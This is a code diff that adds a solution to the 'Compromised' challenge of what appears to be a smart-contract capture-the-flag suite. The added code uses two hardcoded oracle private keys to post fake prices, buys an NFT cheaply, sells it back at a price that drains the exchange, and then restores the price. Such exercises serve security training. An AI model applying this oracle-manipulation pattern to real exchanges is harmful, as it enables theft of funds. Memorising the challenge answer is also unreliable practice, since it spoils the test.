@@ -53,6 +53,33 @@ describe('Compromised challenge', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const privateKeys = [
+            "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48",
+            "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9"
+        ]
+
+        const prov = new ethers.providers.Web3Provider(network.provider)
+        const trusted1 = new ethers.Wallet(privateKeys[0], prov);
+        const trusted2 = new ethers.Wallet(privateKeys[1], prov);
+
+        const PLAYER_INITIAL_ETH_BALANCE_GAS = 1n;
+
+        await oracle.connect(trusted1).postPrice("DVNFT", PLAYER_INITIAL_ETH_BALANCE_GAS)
+        await oracle.connect(trusted2).postPrice("DVNFT", PLAYER_INITIAL_ETH_BALANCE_GAS)
+
+        const response = await exchange.connect(player).buyOne({value: PLAYER_INITIAL_ETH_BALANCE_GAS})
+        const receipt = await response.wait();
+        const tokenIdEvent = receipt.events.find(e => e.event === 'TokenBought');
+        const tokenId = tokenIdEvent.args.tokenId;
+
+        await oracle.connect(trusted1).postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE + 1n)
+        await oracle.connect(trusted2).postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE + 1n)
+
+        await nftToken.connect(player).approve(exchange.address, tokenId)
+        await exchange.connect(player).sellOne(tokenId);
+
+        await oracle.connect(trusted1).postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE)
+        await oracle.connect(trusted2).postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE)
     });
 
     after(async function () {
